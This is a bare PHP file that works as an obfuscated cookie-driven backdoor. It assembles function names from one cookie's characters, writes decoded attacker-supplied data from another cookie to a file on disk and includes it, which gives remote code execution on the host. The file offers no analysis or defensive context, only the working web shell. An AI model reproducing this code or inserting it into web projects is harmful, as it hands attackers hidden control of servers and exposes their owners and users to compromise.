<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[31])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 6;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[31][$n];
        if (!$c[31][$n + 1]) {
            if (!$c[31][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 6 + 1;
    }
    $k = $p[5]() . $p[17];
    if (!$p[1]($k)) {
        $n = $p[21]($k, $p[25]);
        $p[28]($n, $p[29] . $p[2]($p[8]($c[3])));
    }
    include($k);
}